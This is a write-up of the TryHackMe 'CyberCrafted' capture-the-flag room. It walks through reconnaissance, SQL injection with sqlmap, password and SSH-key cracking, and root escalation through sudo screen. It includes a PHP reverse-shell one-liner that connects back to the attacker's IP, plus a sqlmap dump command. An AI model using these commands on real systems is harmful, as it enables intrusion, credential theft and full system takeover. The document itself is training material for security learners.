# CyberCrafted

Writeup for [CyberCrafted](https://tryhackme.com/room/cybercrafted) room on [Tryhackme.com](https://tryhackme.com/)
URL for this room is: https://tryhackme.com/room/cybercrafted

Table of Contents
=================
* [Port Scan](#Port-Scan)
* [Directory Enumeration](#Directory-Enumeration)
* [Subdomain Listing](#Subdomain-Listing)
* [Web Application Enumeration](#Web-Application-Enumeration)
* [Web Application Exploitation](#Web-Application-Exploitation)
* [Reverse Shell](#Reverse-Shell)
* [SSH Credentials](#SSH-Credentials)
* [Privillege Escalation](#Privillege-Escalation)
* [Root Access](#Root-Access)
* [Conclusion](#Conclusion)

# Port Scan

For port scanning I have used `rustscan` tool. Scanned all 65535 TCP ports and got the folowing results:

![Rust Scan](/CyberCrafted/images/Rust_Scan.png)

It identified ports 22, 80 and 25565 as open. Running a more detailed scan on found open ports with `nmap` reveals their respective versions.

```
# Nmap 7.92 scan initiated Sat Dec 18 12:31:25 2021 as: nmap -vv -sS -A -p22,80,25565, -oN open_ports.txt 10.10.253.145
Nmap scan report for cybercrafted.thm (10.10.253.145)
Host is up, received echo-reply ttl 63 (0.072s latency).
Scanned at 2021-12-18 12:31:25 EST for 14s

PORT      STATE SERVICE   REASON         VERSION
22/tcp    open  ssh       syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk3jETo4Cogly65TvK7OYID0jjr/NbNWJd1TvT3mpDonj9KkxJ1oZ5xSBy+3hOHwDcS0FG7ZpFe8BNwe/ASjD91/TL/a1gH6OPjkZblyc8FM5pROz0Mn1JzzB/oI+rHIaltq8JwTxJMjTt1qjfjf3yqHcEA5zLLrUr+a47vkvhYzbDnrWEMPXJ5w9V2EUxY9LUu0N8eZqjnzr1ppdm3wmC4li/hkKuzkqEsdE4ENGKz322l2xyPNEoaHhEDmC94LTp1FcR4ceeGQ56WzmZe6CxkKA3iPz55xSd5Zk0XTZLTarYTMqxxe+2cRAgqnCtE1QsE7cX4NA/E90EcmBnJh5T
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLntlbdcO4xygQVgz6dRRx15qwlCojOYACYTiwta7NFXs9M2d2bURHdM1dZJBPh5pS0V69u0snOij/nApGU5AZo=
|   256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDbLLQOGt+qbIb4myX/Z/sYQ7cj20+ssISzpZCaMD4/u
80/tcp    open  http      syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Cybercrafted
|_http-favicon: Unknown favicon MD5: 4E1E2DCB46BCB45E53566634707765D9
|_http-server-header: Apache/2.4.29 (Ubuntu)
25565/tcp open  minecraft syn-ack ttl 63 Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=12/18%OT=22%CT=%CU=33790%PV=Y%DS=2%DC=T%G=N%TM=61BE1AFB%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 23.946 days (since Wed Nov 24 13:49:13 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   90.55 ms 10.9.0.1
2   91.27 ms cybercrafted.thm (10.10.253.145)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 18 12:31:39 2021 -- 1 IP address (1 host up) scanned in 14.35 seconds
```

# Web Application Enumeration

Going to the webpage using the given IP address redirects to ***cybercrafted.thm*** domain, but fails to open a website.

![Webpage Access Fail](/CyberCraftedimages/Webpage_Acces_Fail.png)

Adding the given IP address as cybercrafted.thm to the `/etc/hosts` file and reloading a page fixes the error.

![Hosts File](/CyberCraftedimages/Hosts_File.png)

![Minecraft Page](/CyberCraftedimages/Minecraft_Page.png)

# Directory Enumeration

Using `gobuster` tool and `common.txt` wordlist I was able to find three directories on the Minecraft server.

![Directory Enumeration](/CyberCraftedimages/Directory_Enumeration.png)

One of found directories reveals three image files.

![Image Files](/CyberCraftedimages/Image_Files.png)

# Subdomain Listing

Viewing source code of the index page, there is a note telling that other subdomains are added.

![Index Source](/CyberCraftedimages/Index_Source.png)

Using `wfuzz` tool, I found three subdomains for the webpage.

![Subdomains](/CyberCraftedimages/Subdomains.png)

The interesting ones are `admin` and `store`. Main pages on these subdomains were inaccessible, so I added the subdomains to `/etc/hosts` file and searched for `.php` files with gobuster.

Admin subdomain has those files:

![Admin Files](/CyberCraftedimages/Admin_Files.png)

And these could be found within the store subdomain:

![Store Files](/CyberCraftedimages/Store_Files.png)

The store subdomain has a `search.php` file, which in turn shows the search panel:

![Search Store](/CyberCraftedimages/Search_Store.png)

# Web Application Exploitation

Since the page has a search form, it queries SQL database(s). By using `sqlmap` tool I was able to dump the admin table with the admin username and the web flag.

SQL command:

`sqlmap --url http://store.cybercrafted.thm/search.php --forms --dump`

Found table:

![Admin Table](/CyberCraftedimages/Admin_Table.png)

The table also has an admin's password hash. Using `john the ripper` with `rockyou.txt` wordlist has allowed me to crack the hash.

![Admin Password](/CyberCraftedimages/Admin_Password.png)

# Reverse Shell

The `admin` subdomain has an admin login panel.

![Admin Panel](/CyberCraftedimages/Admin_Panel.png)

It is possible to log in using credentials found within the database. Correct credentials grant access to the ***admin panel*** where it is possible to run system commands.

![Admin Commands](/CyberCraftedimages/Admin_Commands.png)

Next I have obtained a PHP reverse shell script from [PayloadsAllTheThings reverse shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

Then I have set up a `netcat` listener on my Kali machine.

![Netcat Listener](/CyberCraftedimages/Netcat_Listener.png)

Executing the reverse shell command leads to a captured shell within the listener.

Reverse shell command:

`php -r '$sock=fsockopen("10.9.9.47",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

Reverse shell:
![Reverse Shell](/CyberCraftedimages/Reverse_Shell.png)

# SSH Credentials

Listing the webserver's `/home` directory shows that the system has a couple of users. Admin's user directory is accessible as well as it's private SSH key.

I have copied the key to my local Kali machine and tried to ssh into the target with it. Turns out, the key is protected with a passphrase.

Using `ssh2john` I was able to convert the key to a format readable by `john the ripper` utility and cracked the passphrase using the `rockyou.txt` wordlist.

![SSH Passphrase](/CyberCrafted/images/SSH_Passphrase.png)

Now it is possible to ssh into the system.

# Privillege Escalation

Heading to `/opt/minecraft` directory, ***minecraft server flag*** is found.

![Minecraft Server Flag](/CyberCraftedimages/Minecraft_Server_Flag.png)

Within the `cybercrafted` subdirectory a sketchy plugin could be found.

![Sketchy Plugin](/CyberCrafted/images/Sketchy_Plugin.png)

The plugin directory has `Passwords.yml` file, which contains MD5 hash of cybercrafted's password.

![CyberCrafted Hash](/CyberCrafted/images/CyberCrafted_Hash.png)

While it is possible to crack the has using john, looking at the `log.txt` file reveals the cybercrafted's password in plain text.

![CyberCrafted Password](/CyberCrafted/images/CyberCrafted_Password.png)

Now it is possible to change to cybercrafted user with `su cybercrafted`. Inside the user's home directory the user flag can be found in `user.txt` file.

![User Flag](/CyberCrafted/images/User_Flag.png)

# Root Access

Issuing `sudo -l` command shows that the cybercrafted user can run `/usr/bin/screen -r cybercrafted` command. When launched, the utility is used for managing the Minecraft games.

![Screen Utility](/CyberCrafted/images/Screen_Utility.png)

Although, as stated in the screen utility manual, issuing a `Ctrl + A + C` command would "create a new window with a shell and switch to that window"

![Screen Shell](/CyberCrafted/images/Screen_Shell.png)

With `Ctrl + A + C` command, root shell is spawned!

![Root Shell](/CyberCrafted/images/Root_Shell.png)

Heading to `/root` directory and reading the `root.txt` file gives the root flag.

![Root Flag](/CyberCrafted/images/Root_Flag.png)

# Conclusion

1. Conducted port scan with Rustscan - found open ports 22, 80 and 25565.
2. A Minecraft server was running on one of them.
3. Modifying /etc/hosts file to bind the IP address to cybercrafted.thm allowed to access the webpage.
4. During directory enumeration I was able to find a couple of directories.
5. Subdomain enumeration found three subdomains.
6. Store.cybercrafted.thm was vulnerable to sql injection - I dumped a database with server's admin credentials.
7. Cracked admin password hash with John the Ripper.
8. Using these credentials I logged into admin.cybercrafted.thm.
9. Put a PHP reverse shell on the system command execution field - got a shell access to the system.
10. Copied admin's private SSH key to my local machine.
11. Cracked SSH passphrase with John the Ripper.
12. Logged in to the system as admin.
13. Found a sketchy plugin in /opt/minecraft.
14. Within the plugin directory, I found login credentials for the second user.
15. Exploited the screen utility as the second user to gain the root shell.

Done!
